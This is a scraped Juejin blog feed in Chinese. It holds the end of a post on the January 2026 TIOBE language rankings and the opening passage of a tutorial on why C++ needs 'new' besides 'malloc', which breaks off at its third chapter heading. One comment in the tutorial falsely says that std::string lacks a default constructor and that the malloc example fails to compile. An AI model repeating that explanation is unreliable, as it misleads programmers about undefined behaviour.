p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是凌览。</p>
<ul>
<li>个人网站：<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.code24.top%2F" target="_blank" title="https://blog.code24.top/" ref="nofollow noopener noreferrer">blog.code24.top</a></li>
<li>去水印下载鸭：<a href="https://link.juejin.cn?target=http%3A%2F%2Fnologo.code.top%2F" target="_blank" title="http://nologo.code.top/" ref="nofollow noopener noreferrer">nologo.code.top</a></li>
</ul>
<p>如果本文能给你提供启发或帮助，欢迎动动小手指，一键三连（<code>点赞</code>、<code>评论</code>、<code>转发</code>），给我一些支持和鼓励谢谢。</p>
<p>这是C#在三年内第二次被TIOBE指数评为年度编程语言。C#之所以获得这一殊荣，是因为其在排名上实现了同比最大增幅。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45357bce37cb4226a9c0636e828dee7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5YeM6KeI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768545640&amp;x-signature=PdJTx0rYXtfI01H3v1NWHp2zXJw%3D" alt="image.png" loading="lazy"/></p>
<p>多年的迭代，C#已经脱胎换骨。语言设计上，C#常常是主流语言中新趋势的早期采纳者。更难得的是，它实现了两次重大的范式转变：一次从“Windows 专属”跃向“跨平台”，一次从“微软私有”走向全面开源，恰到好处，不早不晚。</p>
<p>在商业软件的地盘上，Java 与 C# 的缠斗从未停歇。我曾笃定 Java 会笑到最后，可十几年过去，胜负依旧悬而未决。Java 语法冗长、样板代码横飞，还要背负 Oracle 的所有权——这套组合拳下，Java 究竟还能不能顶住 C# 的步步紧逼？答案仍悬在半空。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/59ed0d46b1c74868a635106ffc4f1b92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5YeM6KeI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768545640&amp;x-signature=dmWK0%2FXNlGqcfU8s3fABjv5Qbxk%3D" alt="image 1.png" loading="lazy"/></p>
<p>2025 年的前十榜单里，C 与 C++ 互换座次。后者迭代再快，激进新特性——譬如模块——仍没逃过“叫好不叫座”的尴尬；而 C 凭一句“简单即快”，稳踞小型嵌入式增量市场，岿然不动。Rust 虽刷出历史最佳第 13，却在这片疆域依旧撞不破天花板</p>
<p>除了C#之外，2025年的其他赢家Perl，从第32名跃升至第11名，重新进入前20名。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a5d2ce9e44a849e9ad885e0271a6c2f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5YeM6KeI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768545640&amp;x-signature=COzCfEnbh3M2KVWNfB1uCBxYtng%3D" alt="image 2.png" loading="lazy"/></p>
<p>另一个重返前10名的语言是R，这主要得益于数据科学和统计计算领域的持续增长。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/250fd38e6d4746c88c8f1041235c9995~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5YeM6KeI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768545640&amp;x-signature=89447kFECA0wM%2FaX0PiLCDfiu1Y%3D" alt="image 3.png" loading="lazy"/></p>
<p>当然也有输家，Go2025年跌出前10名中的位置，Ruby跌出了前20名其他语言</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be0fcea0df104375a20092f6f36da738~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5YeM6KeI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768545640&amp;x-signature=aUdXEfp%2B4JirJ8qb5tMVLFv6Ci4%3D" alt="image 4.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b859ae1d616444518d0bf660b6b645a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5YeM6KeI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768545640&amp;x-signature=e2R4Ar%2BlgFHQdhbzWjeHVfRW1Cs%3D" alt="image 5.png" loading="lazy"/></p>
<h2 data-id="heading-0">2026年1月<strong>编程语言</strong>排行榜</h2>
<p>本月，排名前十的分别是：
Python，C，Java，C++，C#，JavaScript，Visual Basic，SQL，Delphi/Object Pascal，R。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0eab13749d9f441d98a8f5f43aa3ef40~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5YeM6KeI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768545640&amp;x-signature=zrr4R1MHbeYLeXpTyKc%2FkewtOsI%3D" alt="image 6.png" loading="lazy"/></p>
<p>10-20排名如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19edb71f11b04bd6bae40617071e36bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5YeM6KeI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768545640&amp;x-signature=BHW1tOsJszEx3m2h5%2FF2IWoS4CM%3D" alt="image 7.png" loading="lazy"/></p>
<h2 data-id="heading-1"><strong>历年获奖编程语言</strong></h2>
<p>奖项颁发给在一年内评分增长最高的编程语言。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a400d6d3940a467598158ee2f812a6e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5YeM6KeI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768545640&amp;x-signature=qMXseDWqswI4P3k%2Bf07MhYhXmno%3D" alt="image 8.png" loading="lazy"/></p>
<h2 data-id="heading-2">最后</h2>
<p>TIOBE 编程社区指数是衡量编程语言流行度的指标——每月翻新一次。分数拼的是全球熟练工程师的脑袋数、课程开班量与第三方厂商的吆喝声；Google、Amazon、Wikipedia、Bing 等二十余家热门站点共同充当计票器。先打预防针：它既不评选“最好”的语言，也不比拼谁“码”得最长。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【深度解析】为什么C++有了malloc，还需要new？]]></title>    <link>https://juejin.cn/post/7592921639464828970</link>    <guid>https://juejin.cn/post/7592921639464828970</guid>    <pubDate>2026-01-09T06:45:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592921639464828970" data-draft-id="7592921639464812586" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【深度解析】为什么C++有了malloc，还需要new？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-09T06:45:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码事漫谈"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【深度解析】为什么C++有了malloc，还需要new？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码事漫谈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T06:45:25.000Z" title="Fri Jan 09 2026 06:45:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6db449a842d4b658d7902b089f9dcf0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB5LqL5ryr6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768545925&amp;x-signature=Zwt72GxDtpj%2FHARfglaY4bWi4G0%3D" alt="image.png" loading="lazy"/></p>
<p>如果你是C程序员转向C++，一定会有一个疑问：<strong>为什么C++在有了<code>malloc</code>这个成熟的内存分配函数后，还要引入<code>new</code>这个看起来功能相似的操作符？</strong> 这难道不是多此一举吗？</p>
<p>让我用一个生动的比喻开始：<code>malloc</code>就像一个房地产商，他只负责给你一块空地；而<code>new</code>是一个完整的建筑公司，不仅给你土地，还按照你的要求建好房子，完成装修，甚至把家具都摆好。</p>
<h2 data-id="heading-0">第一章：从表面现象看起——一段令人沮丧的代码</h2>
<p>假设我们有一个简单的类：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
<span class="hljs-keyword">public</span>:
    string name;
    <span class="hljs-type">int</span> age;
    <span class="hljs-built_in">Student</span>(string n, <span class="hljs-type">int</span> a) : <span class="hljs-built_in">name</span>(n), <span class="hljs-built_in">age</span>(a) {
        cout &lt;&lt; <span class="hljs-string">"创建学生："</span> &lt;&lt; n &lt;&lt; endl;
    }
    ~<span class="hljs-built_in">Student</span>() {
        cout &lt;&lt; <span class="hljs-string">"销毁学生："</span> &lt;&lt; name &lt;&lt; endl;
    }
};
</code></pre>
<h3 data-id="heading-1">第一次尝试：用malloc创建对象</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// C程序员会很自然地这样写：</span>
Student* s1 = (Student*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Student));
s1-&gt;name = <span class="hljs-string">"张三"</span>;  <span class="hljs-comment">// 编译错误！</span>
s1-&gt;age = <span class="hljs-number">20</span>;      <span class="hljs-comment">// 危险的操作！</span>
</code></pre>
<p><strong>问题出现了</strong>：编译器会告诉我们，string对象没有默认构造，不能直接赋值。更糟糕的是，即使能赋值，我们也没有调用构造函数，虚函数表（如果有的话）也没有初始化。</p>
<h3 data-id="heading-2">第二次尝试：寻找解决方案</h3>
<p>你可能会想："那我能不能malloc之后手动调用构造函数呢？"</p>
<pre><code class="hljs language-cpp" lang="cpp">Student* s2 = (Student*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Student));
s2-&gt;<span class="hljs-built_in">Student</span>(<span class="hljs-string">"李四"</span>, <span class="hljs-number">21</span>);  <span class="hljs-comment">// 语法错误！不能这样调用构造函数</span>
</code></pre>
<p><strong>又一个问题</strong>：C++不允许直接调用构造函数，这是语言设计上的限制。</p>
<h2 data-id="heading-3">第二章：new的登场——解决问题的关键</h2>
<h3 data-id="heading-4">new的简单用法</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// C++的方式如此简洁：</span>
Student* s3 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Student</span>(<span class="hljs-string">"王五"</span>, <span class="hljs-number">22</span>);
<span class="hljs-comment">// 一切正常！对象被完整创建</span>
</code></pre>
<p><strong>发生了什么？</strong> <code>new</code>在这里做了三件事：</p>
<ol>
<li>计算<code>Student</code>类需要的内存大小</li>
<li>分配足够的内存</li>
<li>调用构造函数初始化对象</li>
</ol>
<h3 data-id="heading-5">对比实验：看看背后差异</h3>
<p>让我们通过一个更复杂的例子看清本质：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Complex</span> {
    vector&lt;<span class="hljs-type">int</span>&gt; data;  <span class="hljs-comment">// 动态容器</span>
    string name;       <span class="hljs-comment">// 字符串对象</span>
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">Complex</span>(string n) : <span class="hljs-built_in">name</span>(n), <span class="hljs-built_in">data</span>(<span class="hljs-number">100</span>) {
        cout &lt;&lt; name &lt;&lt; <span class="hljs-string">"构造完成，拥有"</span> &lt;&lt; data.<span class="hljs-built_in">size</span>() &lt;&lt; <span class="hljs-string">"个元素\n"</span>;
    }
    ~<span class="hljs-built_in">Complex</span>() {
        cout &lt;&lt; name &lt;&lt; <span class="hljs-string">"被销毁\n"</span>;
    }
};

<span class="hljs-comment">// 测试1：使用malloc（注定失败）</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test_malloc</span><span class="hljs-params">()</span> </span>{
    Complex* c = (Complex*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Complex));
    <span class="hljs-comment">// 此时c-&gt;data和c-&gt;name都是未初始化的！</span>
    <span class="hljs-comment">// 尝试使用它们会导致未定义行为</span>
    <span class="hljs-comment">// 而且我们无法调用构造函数</span>
}

<span class="hljs-comment">// 测试2：使用new（完美工作）</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test_new</span><span class="hljs-params">()</span> </span>{
    Complex* c = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Complex</span>(<span class="hljs-string">"测试对象"</span>);
    <span class="hljs-comment">// c-&gt;data已经被初始化为100个元素的vector</span>
    <span class="hljs-comment">// c-&gt;name已经被设置为"测试对象"</span>
    <span class="hljs-keyword">delete</span> c;  <span class="hljs-comment">// 自动调用析构函数</span>
}
</code></pre>
<h2 data-id="heading-6">第三章：深入原理——为什么malloc做不到？</h2>
